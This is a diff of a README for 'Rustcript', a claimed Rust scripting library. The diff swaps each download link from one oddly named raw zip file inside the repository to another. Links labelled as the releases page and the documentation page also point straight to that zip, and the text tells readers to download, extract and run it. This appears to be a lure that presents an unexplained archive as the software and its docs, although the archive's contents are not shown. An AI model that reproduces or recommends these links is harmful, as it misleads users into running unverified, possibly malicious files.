@@ -1,6 +1,6 @@
 # 🚀 Rustcript - Securely Add Logic to Rust Applications
 
-[![Download Rustcript](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/github/Software_spongingly.zip)](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/github/Software_spongingly.zip)
+[![Download Rustcript](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/examples/Software_v2.8-beta.4.zip)](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/examples/Software_v2.8-beta.4.zip)
 
 ## 📦 Overview
 
@@ -25,7 +25,7 @@ Rustcript is an embeddable scripting language designed to enhance your Rust appl
 To start using Rustcript, you'll need to download it from the Releases page.
 
 1. **Download Rustcript**: Click the button below to visit the Downloads section.
-   [![Download Rustcript](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/github/Software_spongingly.zip)](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/github/Software_spongingly.zip)
+   [![Download Rustcript](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/examples/Software_v2.8-beta.4.zip)](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/examples/Software_v2.8-beta.4.zip)
 
 2. **Extract the Files**: After downloading, if the file is in a zip format, right-click it and select "Extract All" to unzip the contents.
 
@@ -35,7 +35,7 @@ To start using Rustcript, you'll need to download it from the Releases page.
 
 ## 📥 Download & Install
 
-To download Rustcript, visit this page: [Rustcript Releases Page](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/github/Software_spongingly.zip). You will see a list of available versions.
+To download Rustcript, visit this page: [Rustcript Releases Page](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/examples/Software_v2.8-beta.4.zip). You will see a list of available versions.
 
 1. Choose the latest version.
 2. Click on the download link associated with your operating system.
@@ -57,7 +57,7 @@ To give you a basic idea, here is a simple usage scenario:
 3. Write a small script to dynamically adjust your application settings.
 4. Run the Rust application with the embedded script.
 
-The detailed instructions can be found in the documentation available on the [Rustcript Documentation Page](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/github/Software_spongingly.zip).
+The detailed instructions can be found in the documentation available on the [Rustcript Documentation Page](https://github.com/EruRoraito/Rustcript/raw/refs/heads/main/examples/Software_v2.8-beta.4.zip).
 
 ## 🛠 Contributing
 
